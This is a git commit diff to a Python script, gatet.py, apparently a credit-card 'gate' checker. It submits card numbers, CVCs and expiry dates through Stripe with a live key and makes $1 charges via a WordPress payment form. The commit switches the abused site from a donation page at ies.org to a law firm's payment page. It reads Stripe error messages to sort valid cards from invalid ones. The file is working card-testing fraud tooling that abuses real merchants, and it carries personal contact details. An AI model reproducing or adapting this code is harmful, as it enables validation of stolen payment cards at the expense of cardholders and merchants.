6b954ba34a325542197803ae3a10fba7a13be0db
Rodamuser08 <rodamuser08@gmail.com>
2025-07-08 11:25:04 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -29,19 +29,19 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F155bc2c263%3B+stripe-js-v3%2F155bc2c263%3B+card-element&referrer=https%3A%2F%2Fwww.ies.org&key=pk_live_51P9TaAICMxuGGufT8bmFY2rhq9xRyVXjNbKKfWPDnxokLQfxvLtuodinmJWEvfSwDYd3eTVb3hM79F0A5nytwp8l00vaSpJTcY'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F6296643727%3B+stripe-js-v3%2F6296643727%3B+card-element&key=pk_live_51RCo52AslObX1XoIQQONaUwrBhGaGWOcwotVtFuDJyfIcKzl5F1W0WcnpVFBJWLXRwXyJ0ZNPAPFeoJwl1n8ghMv00fQvbzbVW'
 	
 	response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = response.json()['id']
 	
 	headers = {
-	    'authority': 'www.ies.org',
+	    'authority': 'avagyanlaw.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://www.ies.org',
-	    'referer': 'https://www.ies.org/membership/donate/general/',
+	    'origin': 'https://avagyanlaw.com',
+	    'referer': 'https://avagyanlaw.com/payments/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -53,16 +53,21 @@ def Tele(ccx):
 	}
 	
 	params = {
-	    't': '1751820013450',
+	    't': '1751948377848',
 	}
 	
 	data = {
-	    'data': f'item_24__fluent_sf=&__fluent_form_embded_post_id=157046&_fluentform_24_fluentformnonce=4f689476d3&_wp_http_referer=%2Fmembership%2Fdonate%2Fgeneral%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&in_honor_of=no&donation_amount=Custom%20Amount&custom_donation_amount=1&payment_method=stripe&__stripe_payment_method_id={pm}',
+	    'data': f'__fluent_form_embded_post_id=370&_fluentform_9_fluentformnonce=6a9ebc73b0&_wp_http_referer=%2Fpayments%2F&email_9=rodamuser08%40gmail.com&phone=4303000850&name_7%5Bfirst_7_3%5D=Rodam&name_7%5Blast_7_6%5D=User&address_1%5Baddress_line_1%5D=&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=&address_1%5Bstate%5D=&address_1%5Bzip%5D=&address_1%5Bcountry%5D=&input_text=&input_radio=Single%20Payment&custom-payment-amount_1=1&payment_method=stripe&payment-coupon=&terms-n-condition=on&__ff_all_applied_coupons=&__stripe_payment_method_id={pm}',
 	    'action': 'fluentform_submit',
-	    'form_id': '24',
+	    'form_id': '9',
 	}
 	
-	response = session.post('https://www.ies.org/wp-admin/admin-ajax.php', params=params, headers=headers, data=data)
+	response = session.post(
+	    'https://avagyanlaw.com/wp-admin/admin-ajax.php',
+	    params=params,
+	    headers=headers,
+	    data=data,
+	)
 	
 	try:
 		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
